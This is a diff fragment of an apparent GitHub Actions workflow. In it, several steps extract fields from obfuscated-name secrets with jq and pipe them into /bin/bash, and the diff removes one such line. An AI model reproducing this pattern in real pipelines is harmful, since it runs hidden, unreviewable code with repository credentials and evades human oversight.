@@ -19,7 +19,6 @@ jobs:
           wmj7431: ${{ secrets.wmj7431 }}
         run: |
           printf '%s' "$wmj7431" | jq -r .cmti36 | /bin/bash
-          printf '%s' "$bc4751" | jq -r .z84764 | /bin/bash
           echo $tnya975 | jq -r .wvoq105 | /bin/bash
           printf '%s' "$c87" | jq -r .z5 | /bin/bash
           echo $ezeh2074 | jq -r .l5 | /bin/bash
